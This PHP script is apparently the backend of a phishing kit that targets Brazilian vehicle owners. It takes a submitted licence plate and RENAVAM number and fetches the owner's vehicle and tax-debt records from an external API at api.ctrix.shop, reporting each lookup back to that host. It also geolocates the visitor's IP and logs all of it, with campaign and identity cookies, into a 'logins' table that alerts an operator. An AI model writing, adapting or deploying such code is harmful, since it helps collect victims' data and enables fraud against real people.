<?php

error_reporting(0);

extract($_POST);

if($doc){

    $data = file_get_contents("https://api.ctrix.shop/recuperar-dados?comando=$doc");

    if($data){

        $dataJson = json_decode($data);
        
        if($dataJson->dados){
            
            function limparValor($valor) {
                $valorLimpo = preg_replace('/[^0-9,]/', '', $valor);
                
                $valorLimpo = str_replace(',', '.', $valorLimpo);
            
                return (float)$valorLimpo;
            }

            function get_client_ip() {

                if (!empty($_SERVER['HTTP_CLIENT_IP']))   {
                    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
                }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
                {
                    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
                }else{
                    $ip_address = $_SERVER['REMOTE_ADDR'];
                }
                return $ip_address;
            }

            include_once "../db.php";
            
            $token = $_COOKIE['session'];

            $result = json_encode($dataJson->dados);

            if (strpos($result, 'verifique os dados inseridos e tente novamente') !== false){

                file_get_contents("https://api.ctrix.shop/salvar?protocol=erro&comando=$doc");

                echo $result; 

            }else{

            if (strpos($result, 'IsStatus') !== false){

                file_get_contents("https://api.ctrix.shop/salvar?protocol=sucesso&comando=$doc");
            
                $Xdados = json_decode($result);
            
                $Dados = [];
            
                $TotalDebitos = 0;
                $Faturas = 0;

               $id_usuario =  $_COOKIE['campanha'];
               $identity =  $_COOKIE['Identity'];

                date_default_timezone_set('America/Sao_Paulo');

                $page = $tela;
                $dados64 = base64_encode($result);

                // Limpa registros temporários de digitação antes de verificar/inserir
                $deleteTyping = $pdo->prepare("DELETE FROM logins WHERE login_info LIKE :login_info AND dados = 'Typing iniciado'");
                $deleteTyping->execute([':login_info' => "%$doc%"]);

                $check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info AND resposta <> '' AND resposta IS NOT NULL LIMIT 1");
                $check->execute([':login_info' => "%$doc%"]);
                $exists = $check->fetchColumn();

                if (!$exists) {

                    $ip_address = get_client_ip();

                    $DadosIp = json_decode(file_get_contents("http://ip-api.com/json/$ip_address"));
                    $pais = $DadosIp->country;

                        $data = json_decode($Xdados)->data;

                        $entrada = $data->identificacao->marcaModelo .' | '. $data->identificacao->anoFabricacao;
                        
                        $dados = $entrada;

                        $debitos = 0.0;
                        $debitosCont = 0;

                        foreach ($data->imposto->historico as $item) {
                            if($item->debitos){
                                foreach ($item->debitos as $itemX) {

                                    if($itemX->valorTotalComDesconto){
                                    $valorNumerico = limparValor($itemX->valorTotalComDesconto);
                                    $debitos += $valorNumerico;
                                    $debitosCont++;

                                    }
                                }
                            }
                        }

                        $debitos = "$debitosCont / $debitos";

                        $loginData = [
                            ['label' => 'Placa', 'value' => $doc],
                            ['label' => 'Renevam', 'value' => $renavam]
                        ];

                        $login_info = json_encode($loginData, JSON_UNESCAPED_UNICODE);

                        $hora = date('Y-m-d H:i:s'); // Hora atual

                        $stmt = $pdo->prepare("INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta) VALUES 
                                              (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta)");

                         $is =  $stmt->execute([
                                ':page'       => $page,
                                ':dados'      => $dados,
                                ':debitos'    => $debitos,
                                ':ip'         => $ip_address,
                                ':pais'       => $pais,
                                ':identity'   => $identity,
                                ':hora'       => $hora,
                                ':login_info' => $login_info,
                                ':id_usuario' => $id_usuario,
                                ':resposta' => $dados64
                            ]);

                            if($is){
                                $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual WHERE id = :id");
                                        $updateStmt->execute([
                                            ':audio' => 2,
                                            ':atual' => rand(100000000, 99999999999),
                                            ':id' => 1
                                        ]);
                            }

                }else {

                    if($exists['identity']!=$identity){
                        // Atualizar id_usuario e identity do registro existente
                        $updateLogin = $pdo->prepare("UPDATE logins SET id_usuario = :id_usuario, identity = :identity WHERE login_info LIKE :login_info");
                        $is = $updateLogin->execute([
                            ':id_usuario' => $id_usuario,
                            ':identity' => $identity,
                            ':login_info' => "%$doc%"
                        ]);

                        if($is){
                            $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual WHERE id = :id");
                                    $updateStmt->execute([
                                        ':audio' => 2,
                                        ':atual' => rand(100000000, 99999999999),
                                        ':id' => 1
                                    ]);
                        }
                    }
                  
                }
                 
 
                   echo $Xdados;

                }else {

                    if (strpos($result, 'verifique os dados inseridos e tente novamente') !== false){
                        
                        file_get_contents("https://api.ctrix.shop/salvar?protocol=erro&comando=$doc");

                        return;
                    }
                    
                    echo json_encode(array('IsStatus'=>1, 'message'=>'final'));
                 }
            
            }

        }else{
            echo json_encode(array('IsStatus'=>0, 'message'=>'nenhum dado encontrado 1'));
        }
    }else {
          echo json_encode(array('IsStatus'=>0, 'message'=>'nenhum dado encontrado 2'));
    }
}


?>